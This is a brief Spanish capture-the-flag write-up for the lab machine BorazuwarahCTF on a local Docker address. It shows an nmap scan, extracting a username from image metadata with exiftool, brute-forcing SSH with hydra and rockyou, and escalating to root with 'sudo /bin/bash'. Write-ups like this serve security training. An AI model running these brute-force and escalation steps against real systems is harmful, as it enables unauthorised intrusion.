Maquina: BorazuwarahCTF

Autor: BorazuwarahCTF

Dificultad: Muy Facil

![Screenshot 2024-11-09 090451](https://github.com/user-attachments/assets/38fca2cf-19c2-44e4-8076-4edb8aeb332a)

ping 172.17.0.2 -c 1

![Screenshot 2024-11-09 090615](https://github.com/user-attachments/assets/cb8cc798-a6a2-4a57-b3fc-c9f8b52c6e4f)

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv 

![Screenshot 2024-11-09 090659](https://github.com/user-attachments/assets/a973446a-2cb3-4ae3-a191-7acc19397d28)

Visitamos la pagina web 
https://172.17.0.2

![Screenshot 2024-11-09 090723](https://github.com/user-attachments/assets/33aac728-ce5f-4058-852f-66ceaf79b7fc)

nos descargamos la imagen
usamos la herramienta exiftool
sudo exiftool imagen.jpeg
encontramos el usuario

![Screenshot 2024-11-09 090821](https://github.com/user-attachments/assets/009ace7b-0714-4036-8c86-a5899dd39f2f)

sudo hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2
obtenemos la contraseña y entramos por ssh

![Screenshot 2024-11-09 091050](https://github.com/user-attachments/assets/bd98e087-c0e3-41bf-a25a-78568d51904c)

ssh borazuwarah@172.17.0.2

![Screenshot 2024-11-09 091111](https://github.com/user-attachments/assets/c30f2c86-6a80-44aa-8217-6c9c0d00b1d3)

sudo -l
sudo /bin/bash
whoami

![Screenshot 2024-11-09 091135](https://github.com/user-attachments/assets/16d62621-8302-41d5-813c-e2bbeeb3bec9)
